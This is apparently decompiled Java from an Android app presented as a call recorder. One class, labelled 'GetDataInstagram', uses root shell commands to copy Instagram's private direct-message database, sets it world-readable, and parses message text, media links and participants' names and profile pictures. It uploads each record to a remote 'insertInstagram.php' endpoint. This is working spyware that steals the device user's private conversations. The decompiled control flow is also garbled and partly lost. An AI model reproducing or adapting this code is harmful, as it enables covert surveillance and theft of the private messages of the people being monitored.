package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;

/* compiled from: GetDataInstagram */
public class e extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f163b;

    /* renamed from: a reason: collision with root package name */
    private final Context f164a;

    public e(Context context) {
        this.f164a = context;
    }

    /* JADX WARNING: Code restructure failed: missing block: B:37:0x00c8, code lost:
        r0 = 65535;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:38:0x00c9, code lost:
        r5 = "message";
     */
    /* JADX WARNING: Code restructure failed: missing block: B:39:0x00cb, code lost:
        if (r0 == 0) goto L_0x0112;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:41:0x00ce, code lost:
        if (r0 == 1) goto L_0x0109;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:43:0x00d1, code lost:
        if (r0 == 2) goto L_0x0100;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:45:0x00d4, code lost:
        if (r0 == 3) goto L_0x00f7;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:47:0x00d7, code lost:
        if (r0 == 4) goto L_0x00ee;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:49:0x00da, code lost:
        if (r0 == 5) goto L_0x00e5;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:51:?, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:52:0x00e5, code lost:
        r1 = r7.getString(r7.getColumnIndexOrThrow(r13));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:53:0x00ee, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:54:0x00f7, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:55:0x0100, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:56:0x0109, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:0x0112, code lost:
        r0 = r7.getString(r7.getColumnIndexOrThrow(r5));
     */
    /* JADX WARNING: Removed duplicated region for block: B:160:0x03da  */
    private void a(Context context, String str, String str2, long j) throws Exception {
        long j2;
        String str3;
        long j3;
        Cursor cursor;
        int i;
        long j4;
        Date date;
        long j5;
        String str4;
        String str5;
        String str6;
        Date date2;
        String str7;
        String str8;
        String str9;
        String str10;
        String str11;
        String sb;
        String str12;
        char c2;
        Context context2 = context;
        String str13 = "reel_share";
        String str14 = "link";
        String str15 = "media";
        String str16 = "text";
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context2, str, str2);
        aVar.b();
        long j6 = j;
        Cursor e2 = aVar.e("messages", j6);
        if (e2 == null) {
            return;
        }
        if (e2.getCount() <= 0) {
            a(aVar, e2);
            return;
        }
        j2 = j6;
        str3 = "";
        while (e2.moveToNext()) {
            try {
                j4 = e2.getLong(e2.getColumnIndexOrThrow("timestamp"));
                date = new Date();
                date.setTime(j4);
                Date date3 = new Date();
                j5 = j2;
                try {
                    date3.setTime(a.c.e.e.q(context));
                    Calendar instance = Calendar.getInstance();
                    instance.setTime(date3);
                    instance.add(13, 1);
                    if (date.compareTo(instance.getTime()) > 0) {
                        try {
                            String string = e2.getString(e2.getColumnIndexOrThrow("message_type"));
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("typeMedia : ");
                            sb2.append(string);
                            sb2.toString();
                            switch (string.hashCode()) {
                                case -1807311371:
                                    if (string.equals("raven_media")) {
                                        c2 = 3;
                                        break;
                                    }
                                case 3321850:
                                    if (string.equals(str14)) {
                                        c2 = 1;
                                        break;
                                    }
                                case 3556653:
                                    if (string.equals(str16)) {
                                        c2 = 5;
                                        break;
                                    }
                                case 103772132:
                                    if (string.equals(str15)) {
                                        c2 = 2;
                                        break;
                                    }
                                case 1028493690:
                                    if (string.equals(str13)) {
                                        c2 = 4;
                                        break;
                                    }
                                case 1852196283:
                                    if (string.equals("action_log")) {
                                        c2 = 0;
                                        break;
                                    }
                            }
                        } catch (Exception e3) {
                            e3.getStackTrace();
                        }
                    } else {
                        str4 = str13;
                        str6 = str14;
                        str5 = str15;
                        cursor = e2;
                        j2 = j5;
                    }
                    Context context3 = context;
                    e2 = cursor;
                    str14 = str6;
                    str15 = str5;
                    str13 = str4;
                } catch (Exception e4) {
                    e = e4;
                    j3 = j5;
                    cursor = e2;
                    e.getStackTrace();
                    try {
                        e.getStackTrace();
                        Crashlytics.logException(e);
                    } catch (Exception unused) {
                    }
                    i = 0;
                    if (j3 != 0) {
                    }
                    a(aVar, cursor);
                }
            } catch (Exception e5) {
                e = e5;
                j3 = j2;
                cursor = e2;
                e.getStackTrace();
                e.getStackTrace();
                Crashlytics.logException(e);
                i = 0;
                if (j3 != 0) {
                }
                a(aVar, cursor);
            }
        }
        j3 = j2;
        cursor = e2;
        i = 0;
        if (j3 != 0) {
            a.b.a.a.a.a(context.getSharedPreferences("user", i), "timeinstagram", j3);
        }
        a(aVar, cursor);
        String str17 = null;
        String str18 = str3;
        String str19 = str17;
        if (str19 != null) {
            try {
                JSONObject jSONObject = new JSONObject(str19);
                if (jSONObject.length() != 0) {
                    String string2 = jSONObject.getString("content_type");
                    str10 = str19;
                    try {
                        if (string2.contains("LINK")) {
                            str11 = new JSONObject(jSONObject.getString(str14)).getString(str16);
                        } else if (string2.contains("LIKE")) {
                            str11 = "❤";
                        } else {
                            date2 = date;
                            String str20 = "<a target='_blank' href='";
                            str9 = str18;
                            String str21 = "url";
                            if (string2.contains("ANIMATED_MEDIA")) {
                                try {
                                    JSONObject jSONObject2 = new JSONObject(new JSONObject(new JSONObject(jSONObject.getString("animated_media")).getString("images")).getString("fixed_height"));
                                    StringBuilder sb3 = new StringBuilder();
                                    sb3.append(str20);
                                    sb3.append(jSONObject2.getString(str21));
                                    sb3.append("'>GIF.gif</a>");
                                    str11 = sb3.toString();
                                } catch (Exception e6) {
                                    e = e6;
                                    str6 = str14;
                                    e.getStackTrace();
                                    try {
                                        e.getStackTrace();
                                        Crashlytics.logException(e);
                                    } catch (Exception unused2) {
                                    }
                                    str7 = str10;
                                    String string3 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                                    String b2 = b(aVar, string3);
                                    String a2 = a(aVar, string3);
                                    Date date4 = new Date();
                                    date4.setTime(j4 / 1000);
                                    Date date5 = date2;
                                    str5 = str15;
                                    j3 = j5;
                                    str4 = str13;
                                    cursor = e2;
                                    a(context, a2, str7, b2, d2.format(Long.valueOf(date4.getTime())), "socialNetwork/root/insertInstagram.php");
                                    j2 = date5.getTime();
                                    str3 = str7;
                                    Context context32 = context;
                                    e2 = cursor;
                                    str14 = str6;
                                    str15 = str5;
                                    str13 = str4;
                                }
                            } else if (string2.contains("ACTION_LOG")) {
                                str11 = new JSONObject(jSONObject.getString("action_log")).getString("description");
                            } else {
                                str6 = str14;
                                String str22 = "'>Video.mp4</a>";
                                String str23 = "video_versions";
                                if (string2.contains("REEL_SHARE")) {
                                    try {
                                        JSONObject jSONObject3 = new JSONObject(jSONObject.getString(str13));
                                        String string4 = jSONObject3.getString(str16);
                                        try {
                                            JSONObject jSONObject4 = new JSONObject(jSONObject3.getString(str15));
                                            if (jSONObject4.length() != 0) {
                                                int i2 = jSONObject4.getInt("media_type");
                                                if (i2 == 1) {
                                                    JSONArray jSONArray = new JSONArray(new JSONObject(jSONObject4.getString("image_versions2")).getString("candidates"));
                                                    StringBuilder sb4 = new StringBuilder();
                                                    sb4.append(string4);
                                                    sb4.append("<br/><img src='");
                                                    sb4.append(jSONArray.getJSONObject(0).getString(str21));
                                                    sb4.append("'/>");
                                                    str12 = sb4.toString();
                                                } else if (i2 != 2) {
                                                    JSONArray jSONArray2 = new JSONArray(jSONObject4.getString(str23));
                                                    StringBuilder sb5 = new StringBuilder();
                                                    sb5.append(string4);
                                                    sb5.append("<br/><a target='_blank' href='");
                                                    sb5.append(jSONArray2.getJSONObject(0).getString(str21));
                                                    sb5.append(str22);
                                                    str12 = sb5.toString();
                                                } else {
                                                    JSONArray jSONArray3 = new JSONArray(jSONObject4.getString(str23));
                                                    StringBuilder sb6 = new StringBuilder();
                                                    sb6.append(string4);
                                                    sb6.append("<br/><a target='_blank' href='");
                                                    sb6.append(jSONArray3.getJSONObject(0).getString(str21));
                                                    sb6.append(str22);
                                                    str12 = sb6.toString();
                                                }
                                            } else {
                                                str12 = str9;
                                            }
                                            str8 = str12;
                                        } catch (Exception e7) {
                                            e7.getStackTrace();
                                            str8 = str9;
                                            str7 = str8;
                                            String string32 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                                            String b22 = b(aVar, string32);
                                            String a22 = a(aVar, string32);
                                            Date date42 = new Date();
                                            date42.setTime(j4 / 1000);
                                            Date date52 = date2;
                                            str5 = str15;
                                            j3 = j5;
                                            str4 = str13;
                                            cursor = e2;
                                            a(context, a22, str7, b22, d2.format(Long.valueOf(date42.getTime())), "socialNetwork/root/insertInstagram.php");
                                            j2 = date52.getTime();
                                            str3 = str7;
                                            Context context322 = context;
                                            e2 = cursor;
                                            str14 = str6;
                                            str15 = str5;
                                            str13 = str4;
                                        }
                                    } catch (Exception e8) {
                                        e = e8;
                                        e.getStackTrace();
                                        e.getStackTrace();
                                        Crashlytics.logException(e);
                                        str7 = str10;
                                        String string322 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                                        String b222 = b(aVar, string322);
                                        String a222 = a(aVar, string322);
                                        Date date422 = new Date();
                                        date422.setTime(j4 / 1000);
                                        Date date522 = date2;
                                        str5 = str15;
                                        j3 = j5;
                                        str4 = str13;
                                        cursor = e2;
                                        a(context, a222, str7, b222, d2.format(Long.valueOf(date422.getTime())), "socialNetwork/root/insertInstagram.php");
                                        j2 = date522.getTime();
                                        str3 = str7;
                                        Context context3222 = context;
                                        e2 = cursor;
                                        str14 = str6;
                                        str15 = str5;
                                        str13 = str4;
                                    }
                                } else {
                                    if (string2.contains("EXPIRING_MEDIA")) {
                                        sb = "Photo taken with the camera (not available)";
                                    } else if (string2.contains("MEDIA")) {
                                        JSONObject jSONObject5 = new JSONObject(jSONObject.getString(str15));
                                        int i3 = jSONObject5.getInt("media_type");
                                        if (i3 == 1) {
                                            JSONArray jSONArray4 = new JSONArray(new JSONObject(jSONObject5.getString("image_versions2")).getString("candidates"));
                                            StringBuilder sb7 = new StringBuilder();
                                            sb7.append("<img src='");
                                            sb7.append(jSONArray4.getJSONObject(0).getString(str21));
                                            sb7.append("'/>");
                                            str8 = sb7.toString();
                                        } else if (i3 != 2) {
                                            JSONArray jSONArray5 = new JSONArray(jSONObject5.getString(str23));
                                            StringBuilder sb8 = new StringBuilder();
                                            sb8.append(str20);
                                            sb8.append(jSONArray5.getJSONObject(0).getString(str21));
                                            sb8.append(str22);
                                            sb = sb8.toString();
                                        } else {
                                            JSONArray jSONArray6 = new JSONArray(jSONObject5.getString(str23));
                                            StringBuilder sb9 = new StringBuilder();
                                            sb9.append(str20);
                                            sb9.append(jSONArray6.getJSONObject(0).getString(str21));
                                            sb9.append(str22);
                                            sb = sb9.toString();
                                        }
                                    } else {
                                        str8 = str10;
                                    }
                                    str8 = sb;
                                }
                                str7 = str8;
                                String string3222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                                String b2222 = b(aVar, string3222);
                                String a2222 = a(aVar, string3222);
                                Date date4222 = new Date();
                                date4222.setTime(j4 / 1000);
                                Date date5222 = date2;
                                str5 = str15;
                                j3 = j5;
                                str4 = str13;
                                cursor = e2;
                                a(context, a2222, str7, b2222, d2.format(Long.valueOf(date4222.getTime())), "socialNetwork/root/insertInstagram.php");
                                j2 = date5222.getTime();
                                str3 = str7;
                                Context context32222 = context;
                                e2 = cursor;
                                str14 = str6;
                                str15 = str5;
                                str13 = str4;
                            }
                            str8 = str11;
                            str6 = str14;
                            str7 = str8;
                            String string32222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                            String b22222 = b(aVar, string32222);
                            String a22222 = a(aVar, string32222);
                            Date date42222 = new Date();
                            date42222.setTime(j4 / 1000);
                            Date date52222 = date2;
                            str5 = str15;
                            j3 = j5;
                            str4 = str13;
                            cursor = e2;
                            a(context, a22222, str7, b22222, d2.format(Long.valueOf(date42222.getTime())), "socialNetwork/root/insertInstagram.php");
                            j2 = date52222.getTime();
                            str3 = str7;
                            Context context322222 = context;
                            e2 = cursor;
                            str14 = str6;
                            str15 = str5;
                            str13 = str4;
                        }
                        date2 = date;
                        str8 = str11;
                        str6 = str14;
                        str7 = str8;
                    } catch (Exception e9) {
                        e = e9;
                        date2 = date;
                        str6 = str14;
                        e.getStackTrace();
                        e.getStackTrace();
                        Crashlytics.logException(e);
                        str7 = str10;
                        String string322222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                        String b222222 = b(aVar, string322222);
                        String a222222 = a(aVar, string322222);
                        Date date422222 = new Date();
                        date422222.setTime(j4 / 1000);
                        Date date522222 = date2;
                        str5 = str15;
                        j3 = j5;
                        str4 = str13;
                        cursor = e2;
                        a(context, a222222, str7, b222222, d2.format(Long.valueOf(date422222.getTime())), "socialNetwork/root/insertInstagram.php");
                        j2 = date522222.getTime();
                        str3 = str7;
                        Context context3222222 = context;
                        e2 = cursor;
                        str14 = str6;
                        str15 = str5;
                        str13 = str4;
                    }
                    String string3222222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                    String b2222222 = b(aVar, string3222222);
                    String a2222222 = a(aVar, string3222222);
                    Date date4222222 = new Date();
                    date4222222.setTime(j4 / 1000);
                    Date date5222222 = date2;
                    str5 = str15;
                    j3 = j5;
                    str4 = str13;
                    cursor = e2;
                    a(context, a2222222, str7, b2222222, d2.format(Long.valueOf(date4222222.getTime())), "socialNetwork/root/insertInstagram.php");
                    j2 = date5222222.getTime();
                    str3 = str7;
                    Context context32222222 = context;
                    e2 = cursor;
                    str14 = str6;
                    str15 = str5;
                    str13 = str4;
                }
            } catch (Exception e10) {
                e = e10;
                str10 = str19;
                date2 = date;
                str6 = str14;
                e.getStackTrace();
                e.getStackTrace();
                Crashlytics.logException(e);
                str7 = str10;
                String string32222222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
                String b22222222 = b(aVar, string32222222);
                String a22222222 = a(aVar, string32222222);
                Date date42222222 = new Date();
                date42222222.setTime(j4 / 1000);
                Date date52222222 = date2;
                str5 = str15;
                j3 = j5;
                str4 = str13;
                cursor = e2;
                a(context, a22222222, str7, b22222222, d2.format(Long.valueOf(date42222222.getTime())), "socialNetwork/root/insertInstagram.php");
                j2 = date52222222.getTime();
                str3 = str7;
                Context context322222222 = context;
                e2 = cursor;
                str14 = str6;
                str15 = str5;
                str13 = str4;
            }
        }
        date2 = date;
        str9 = str18;
        str6 = str14;
        str8 = str9;
        str7 = str8;
        String string322222222 = e2.getString(e2.getColumnIndexOrThrow("thread_id"));
        String b222222222 = b(aVar, string322222222);
        String a222222222 = a(aVar, string322222222);
        Date date422222222 = new Date();
        date422222222.setTime(j4 / 1000);
        Date date522222222 = date2;
        str5 = str15;
        j3 = j5;
        str4 = str13;
        cursor = e2;
        try {
            a(context, a222222222, str7, b222222222, d2.format(Long.valueOf(date422222222.getTime())), "socialNetwork/root/insertInstagram.php");
            j2 = date522222222.getTime();
            str3 = str7;
            Context context3222222222 = context;
            e2 = cursor;
            str14 = str6;
            str15 = str5;
            str13 = str4;
        } catch (Exception e11) {
            e = e11;
            e.getStackTrace();
            e.getStackTrace();
            Crashlytics.logException(e);
            i = 0;
            if (j3 != 0) {
            }
            a(aVar, cursor);
        }
    }

    private String b(a aVar, String str) {
        String str2 = "";
        try {
            Cursor a2 = aVar.a("threads", "thread_id", str);
            if (a2 == null || a2.getCount() <= 0 || !a2.moveToLast()) {
                return str2;
            }
            JSONObject jSONObject = new JSONObject(new JSONObject(a2.getString(a2.getColumnIndexOrThrow("thread_info"))).getString("inviter"));
            if (jSONObject.length() == 0) {
                return str2;
            }
            String string = jSONObject.getString("username");
            String string2 = jSONObject.getString("full_name");
            String string3 = jSONObject.getString("profile_pic_url");
            StringBuilder sb = new StringBuilder();
            sb.append(string2);
            sb.append(" (");
            sb.append(string);
            sb.append(")<br/><img src='");
            sb.append(string3);
            sb.append("'/>");
            return sb.toString();
        } catch (Exception e2) {
            e2.getStackTrace();
            return str2;
        }
    }

    public void run() {
        String str = "\n";
        try {
            Thread.sleep(4000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f163b) {
            a(this.f164a);
            return;
        }
        f163b = true;
        try {
            if (a.c.e.e.q(this.f164a) == 0) {
                a.c.e.c.f(this.f164a);
            }
            if (a.c.e.e.q(this.f164a) != 0) {
                long q = a.c.e.e.q(this.f164a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.instagram.android/databases/");
                sb.append("direct.db");
                sb.append(" > ");
                sb.append(a.c.e.c.a());
                sb.append("Insta.db");
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a.c.e.c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f164a, a.c.e.c.a(), "Insta.db", q);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f163b = false;
        a(this.f164a);
    }

    private String a(a aVar, String str) {
        String str2 = "";
        try {
            Cursor a2 = aVar.a("threads", "thread_id", str);
            if (a2 != null && a2.getCount() > 0 && a2.moveToLast()) {
                JSONArray jSONArray = new JSONArray(new JSONObject(a2.getString(a2.getColumnIndexOrThrow("thread_info"))).getString("recipients"));
                for (int i = 0; i < jSONArray.length(); i++) {
                    JSONObject jSONObject = jSONArray.getJSONObject(i);
                    if (jSONObject.length() != 0) {
                        String string = jSONObject.getString("username");
                        String string2 = jSONObject.getString("full_name");
                        String string3 = jSONObject.getString("profile_pic_url");
                        StringBuilder sb = new StringBuilder();
                        sb.append(str2);
                        sb.append(string2);
                        sb.append(" (");
                        sb.append(string);
                        sb.append(")<br/><img src='");
                        sb.append(string3);
                        sb.append("'/><br/>");
                        str2 = sb.toString();
                    }
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return str2;
    }
}
